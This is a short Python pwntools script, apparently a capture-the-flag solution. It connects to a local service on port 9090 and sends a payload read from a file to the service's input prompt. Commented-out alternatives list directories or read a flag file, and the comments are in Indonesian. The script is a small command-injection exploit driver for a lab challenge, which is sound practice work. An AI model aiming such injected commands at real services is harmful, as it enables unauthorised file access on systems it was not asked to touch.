import pwn

ip = "localhost"
port = 9090

io = pwn.remote(ip, port)
#command = open("ls_current_dir.txt", "r").read() #lihat isi folder
#command = open("ls_dir_flag.txt", "r").read() #lihat isi folder md5 (folder flag disimpan)
command = open("cat_flag.txt", "r").read() #baca flag.txt

io.sendlineafter("input>> ", command)
io.interactive()